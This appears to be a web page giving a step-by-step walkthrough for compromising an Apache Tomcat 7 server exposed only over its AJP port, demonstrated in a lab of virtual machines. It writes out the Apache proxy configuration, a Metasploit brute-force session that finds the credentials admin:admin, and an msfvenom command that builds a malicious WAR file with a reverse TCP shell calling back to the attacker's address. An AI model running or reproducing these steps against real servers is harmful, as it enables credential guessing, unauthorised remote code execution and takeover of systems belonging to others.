<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Jserv</title>
</head><body>Having the Tomcat service exposed allows attackers to access the Tomcat Manager interface. Although often password protected, brute force attacks using default and common passwords have proven successful in the past. Once access to the manager interface has been achieved, compromising the server becomes trivial with the WAR file deployment functionality.<br/>
<br/>
The Apache JServ Protocol (AJP) is essentially an optimized binary version of HTTP. This makes communication with the AJP port rather difficult using conventional tools. The simplest solution is to configure Apache as a local proxy, which performs transparent conversion of HTTP traffic to AJP format. Once configured, an attacker can use common tools such as Hydra and Metasploit to exploit the Tomcat server over AJP.<br/>
<br/>
The following guide will demonstrate how to configure Apache and exploit a Tomcat 7 instance, running on an Ubuntu 16.10 virtual machine. The Ubuntu firewall was enabled with only port 8009 accessible, and weak credentials used on the Tomcat manager interface. The attacking machine was a default Kali 2016.2 image installed inside a virtual machine.<br/>
Step 1: Install the Dependencies<br/>
<br/>
The first line installs the mod-jk package which allows Apache to forward requests to Tomcat using the AJP protocol. It can communication to Tomcat on the local machine or to a remote instance. The second line enables the proxy_ajp module and required dependencies automatically.<br/>
&#09;<br/>
apt install libapache2-mod-jk<br/>
a2enmod proxy_ajp<br/>
<br/>
Step 2: Configure Apache<br/>
<br/>
Next create a configuration file in /etc/apache2/sites-enabled/ which will hold our proxy setup, Iâ€™ve named mine ajp.conf.<br/>
&#09;<br/>
ProxyRequests Off<br/>
# Only allow localhost to proxy requests<br/>
&lt;Proxy *&gt;<br/>
Order deny,allow<br/>
Deny from all<br/>
Allow from localhost<br/>
&lt;/Proxy&gt;<br/>
# Change the IP address in the below lines to the remote servers IP address hosting the Tomcat instance<br/>
ProxyPass &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; / ajp://192.168.109.134:8009/<br/>
ProxyPassReverse &nbsp; &nbsp;/ ajp://192.168.109.134:8009/<br/>
<br/>
Now start apache.<br/>
&#09;<br/>
systemctl start apache2<br/>
<br/>
Visiting 127.0.0.1 should cause Apache to redirect the request to the specified server in the ajp.conf file using the AJP protocol.<br/>
<br/>
Step 3: Brute Force Credentials<br/>
<br/>
There are a few tools available to exploit the Tomcat manager. Metasploit contains an auxiliary module to brute force the login credentials.<br/>
&#09;<br/>
msf &gt; use auxiliary/scanner/http/tomcat_mgr_login<br/>
msf auxiliary(tomcat_mgr_login) &gt; set RHOSTS 127.0.0.1<br/>
RHOSTS =&gt; 127.0.0.1<br/>
msf auxiliary(tomcat_mgr_login) &gt; set RPORT 80<br/>
RPORT =&gt; 80<br/>
msf auxiliary(tomcat_mgr_login) &gt; set STOP_ON_SUCCESS true<br/>
STOP_ON_SUCCESS =&gt; true<br/>
msf auxiliary(tomcat_mgr_login) &gt; run<br/>
[+] 127.0.0.1:80 - LOGIN SUCCESSFUL: admin:admin<br/>
[*] Scanned 1 of 1 hosts (100% complete)<br/>
[*] Auxiliary module execution completed<br/>
<br/>
Step 4: Exploit<br/>
<br/>
Generate a malicious WAR file containing a reverse TCP shell. Configure the local IP and port accordingly.<br/>
<br/>
msfvenom -p java/shell_reverse_tcp LHOST=192.168.109.129 LPORT=4444 -f war &gt; shell3.war<br/>
<br/>
Setup a handler in Metasploit then visit the manger interface to deploy the malicious WAR. Once uploaded make sure to visit the malicious URL (available in applications list) at least once to cause the WAR to execute. You should have received a shell in the Metasploit handler.</body></html>